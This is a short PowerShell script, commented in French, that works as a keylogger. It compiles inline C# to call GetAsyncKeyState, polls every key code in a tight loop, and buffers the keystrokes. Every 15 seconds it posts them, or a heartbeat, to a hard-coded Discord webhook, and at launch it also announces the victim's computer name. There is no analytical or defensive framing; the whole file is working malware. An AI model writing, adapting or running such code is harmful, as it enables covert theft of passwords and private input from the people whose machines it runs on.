$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

$code = @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
}
'@

Add-Type $code

$buf = ''
$lastSend = Get-Date

while($true){
    Start-Sleep -m 30
    for($i=8;$i -le 254;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $buf += [char]$i
        }
    }

    # Envoi toutes les 15 secondes, même si buffer vide (pour montrer qu'il est vivant)
    if(((Get-Date) - $lastSend).TotalSeconds -ge 15){
        if($buf.Length -gt 0){
            iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        } else {
            iwr $webhook -Method Post -Body (@{content="[heartbeat]"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
        $buf = ''
        $lastSend = Get-Date
    }
}
